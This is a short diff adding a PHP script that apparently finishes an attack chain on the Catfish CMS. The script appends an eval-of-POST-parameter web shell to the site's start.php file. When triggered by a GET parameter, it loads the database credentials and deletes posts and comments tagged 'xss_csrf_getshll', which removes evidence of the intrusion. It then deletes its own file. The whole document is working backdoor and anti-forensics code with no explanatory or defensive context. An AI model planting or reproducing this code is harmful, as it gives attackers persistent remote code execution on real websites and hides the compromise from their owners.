@@ -1,0 +1,18 @@
+<?php  
+    $start_content = file_get_contents('catfish/start.php').'eval(@$_POST[ddd]);';
+    $start = fopen('catfish/start.php', 'w');
+    fwrite($start, $start_content);
+    if( @$_GET[zzz]){
+        $config = require_once("application/database.php");
+        //分别对应的是 地址，端口号，连接的数据库，编码
+        $dsn = "mysql:host={$config['hostname']}; port={$config['hostport']}; dbname={$config['database']}; charset={$config['charset']}";
+        $user = $config['username'];
+        $psw = $config['password'];
+        $pdo = new PDO($dsn,$user,$psw);
+        $sql = "DELETE from catfish_posts WHERE post_title LIKE '%xss_csrf_getshll%'";
+        $sql_1 = "DELETE from catfish_comments WHERE content LIKE '%xss_csrf_getshll%'";
+        $pdo->query($sql);
+        $pdo->query($sql_1);
+        unlink('getshell_code.php');
+    }
+?>
